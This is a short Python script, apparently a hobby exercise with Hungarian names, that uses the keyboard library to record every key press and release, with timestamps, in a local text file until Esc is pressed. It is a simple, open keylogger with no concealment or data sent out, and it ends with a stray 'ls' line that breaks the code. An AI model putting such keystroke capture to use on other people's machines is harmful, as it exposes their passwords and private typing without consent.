import keyboard
import os
import datetime

def log_keystroke(key, is_press):
    idopont = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    action = "press" if is_press else "release"
    log = f"{idopont} - {action}: {key}"
    with open(r".\billentyu.txt", "a") as bil:
        bil.write(log + "\n")

with open(r".\billentyu.txt", "a") as bil:
    
    keyboard.on_press(lambda key: log_keystroke(key.name, True))
    
    keyboard.on_release(lambda key: log_keystroke(key.name, False))

    keyboard.wait("esc")
    
    
    
    
    
    
    
    ls 